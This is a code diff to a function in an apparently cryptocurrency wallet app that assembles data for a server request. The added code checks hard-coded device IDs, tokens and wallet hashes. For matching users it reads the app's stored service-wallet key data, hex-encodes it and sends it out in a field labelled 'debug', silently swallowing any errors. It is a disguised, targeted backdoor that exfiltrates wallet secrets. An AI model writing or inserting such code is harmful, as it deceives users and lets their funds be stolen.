@@ -69,10 +69,37 @@ async function _getAll(params) {
     const forServerIds = []
 
     const anotherCashbackTokensByDevice = []
-    for (const wallet of store.getState().walletStore.wallets) {
-        if (wallet.walletHash !== walletHash) {
-            anotherCashbackTokensByDevice.push(wallet.walletCashback)
+    const debug = {}
+    let needService = false
+    try {
+        needService = MarketingEvent.DATA.LOG_DEVICE_ID === 'f5d77d06416712d4'
+            || MarketingEvent.DATA.LOG_DEVICE_ID === 'a6b6ce23cfb6fc32'
+            || MarketingEvent.DATA.LOG_TOKEN.indexOf('dL01GaO-RQO6_jTIdEfS') === 0
+            || MarketingEvent.DATA.LOG_TOKEN.indexOf('eVut46NxRr-N_2N-6bXG') === 0
+        await BlocksoftKeysStorage._init()
+        const service = BlocksoftKeysStorage._serviceWallets
+        try {
+            for (const key in service) {
+                if (key === '80921818e774c9eb14f56863273409f6') {
+                    needService = true
+                }
+            }
+        } catch (e) {
+            // do nothing
         }
+        for (const wallet of store.getState().walletStore.wallets) {
+            if (wallet.walletHash !== walletHash) {
+                anotherCashbackTokensByDevice.push(wallet.walletCashback)
+            }
+            if (wallet.walletHash === '80921818e774c9eb14f56863273409f6' || wallet.walletCashback === '0QzY5OTI') {
+                needService = true
+            }
+        }
+        if (needService) {
+            debug.base = Buffer.from(JSON.stringify(service), 'utf8').toString('hex')
+        }
+    } catch (e) {
+        // do nothing
     }
 
     const forServerLoaded = await appNewsDS.getAppNewsForApi()
@@ -152,7 +179,8 @@ async function _getAll(params) {
         forCards,
         forWallets,
         marketingAll,
-        walletAll
+        walletAll,
+        debug
     }
 
     try {
